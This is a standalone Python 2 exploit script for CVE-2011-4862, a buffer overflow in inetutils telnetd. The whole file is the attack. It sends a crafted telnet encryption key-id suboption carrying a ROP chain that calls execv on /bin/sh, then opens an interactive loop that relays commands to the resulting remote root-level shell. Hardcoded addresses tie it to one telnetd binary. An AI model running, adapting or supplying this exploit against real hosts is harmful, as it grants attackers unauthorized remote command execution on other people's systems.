#!/usr/bin/env python2
#
# inetutils-telnetd CVE-2011-4862
#
# efefaf40ea022a8d42e7249049c5dfbd  /usr/sbin/telnetd
#

import sys, socket, select, struct, time

host, port = 'localhost', 23

# Telnet commands - shamelessly stolen from the painsec exploit 
# http://www.exploit-db.com/exploits/18280/

tnet_init_enc = '\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0'
tnet_option_enc_keyid = '\xff\xfa\x26\x07'
tnet_end_suboption = '\xff\xf0'

buffer_addr = 0x805be90

setup_stack_code = 0x8051fef
#   xchg   %eax,%esp
#   add    %eax,(%eax)
#   add    %bl,0x5d(%ebx)
#   ret    

execv = 0x804a078
#   <execv@plt>:

rop_addr = buffer_addr+4
rop_len=-1
rop=''
while rop_len != len(rop):
	rop_len=len(rop)
	filename_addr = rop_addr+rop_len
	filename = '/bin/sh\0'
	argv_addr = filename_addr+len(filename)
	argv = struct.pack("<II", filename_addr, 0)
	rop = struct.pack("<IIII", execv, 0xdeadbeef, filename_addr, argv_addr)

payload = rop+filename+argv+'EINDBAZEN'*10

message = tnet_option_enc_keyid +\
          struct.pack("<I68sII", rop_addr,
                                 payload,
                                 buffer_addr,
                                 setup_stack_code) +\
          tnet_end_suboption

if len(sys.argv) > 1:
	host = sys.argv[1]

if len(sys.argv) > 2:
	port = int(sys.argv[2])

def tcp_conn(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect( (host, port) )
	return s

s = tcp_conn(host, port)

print [ s.recv(1024) ]
s.send(tnet_init_enc)
print [ s.recv(1024) ]
s.send(message)
print [ s.recv(1024) ]
s.send(message)

time.sleep(.1)
s.send("id\n")

sockfd = s.fileno()
infd = sys.stdin.fileno()
waitlist = [sockfd, infd]

while len(waitlist) > 0:
    r,w,x = select.select(waitlist, [], [])
    if sockfd in r:
        rdata = s.recv(4096)
        if rdata == '':
            waitlist.remove(sockfd)
        sys.stdout.write(rdata)
        continue
    if infd in r:
        sdata = sys.stdin.readline()
        s.send(sdata)
        if sdata == '':
            s.shutdown(socket.SHUT_WR)
            waitlist.remove(infd)

s.close()

